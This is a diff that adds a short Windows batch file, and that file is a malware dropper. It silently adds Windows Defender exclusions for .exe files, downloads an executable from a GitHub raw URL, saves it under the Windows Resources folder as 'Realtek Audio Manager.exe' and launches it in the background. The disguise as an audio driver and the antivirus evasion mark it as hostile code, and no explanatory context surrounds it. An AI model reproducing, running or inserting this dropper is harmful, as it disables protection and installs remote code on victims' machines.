@@ -1,0 +1,2 @@
+ÿþ
+@echo off & powershell -Command "Add-MpPreference -ExclusionExtension .exe" & powershell -Command "Add-MpPreference -ExclusionExtension exe" & powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/ruter13412/ttttuhf/main/Realtek%20HD%20Audio%20Universal%20Hosting.exe -OutFile '%windir%\Resources\Realtek Audio Manager.exe'" & Start /B "" "%WinDir%\Resources\Realtek Audio Manager.exe" 
